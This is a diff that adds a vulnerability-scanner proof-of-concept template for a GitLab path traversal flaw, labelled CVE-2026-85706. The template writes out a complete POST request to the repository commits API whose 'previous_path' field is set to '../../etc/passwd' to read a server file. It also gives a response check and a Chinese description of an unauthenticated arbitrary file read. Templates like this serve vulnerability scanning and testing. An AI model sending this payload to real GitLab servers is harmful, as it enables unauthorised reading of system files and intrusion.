@@ -1,0 +1,21 @@
+name: poc-yaml-gitlab-commits-api-path-traversal
+groups:
+  fileread:
+    - method: POST
+      path: /api/v4/projects/1/repository/commits
+      headers:
+        Content-Type: application/json
+      body: >-
+        {"branch":"master","commit_message":"test","actions":[{"action":"update","file_path":"test.txt","content":"test","previous_path":"../../etc/passwd"}]}
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"author") || response.body.bcontains(b"committer") || response.body.bcontains(b"message"))
+detail:
+  author: L4xy
+  description: "GitLab CE/EE存在未授权路径遍历漏洞(CVE-2026-85706)，攻击者可通过repository commits API读取服务器上的任意文件，影响18.7-19.3.1版本"
+  links:
+    - https://github.com/jithinkrishnanrs/gitlab-cve-2026-85706-ioc/blob/main/README.md
+    - https://github.com/solivaquaant/CVE-2026-85706/blob/main/ANALYSIS.md
+    - https://watchtowr.com/resources/rapid-reaction-gitlab-critical-path-traversal-vulnerability-cve-2026-85706/
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-85706
+  tags: path-traversal,fileread,gitlab
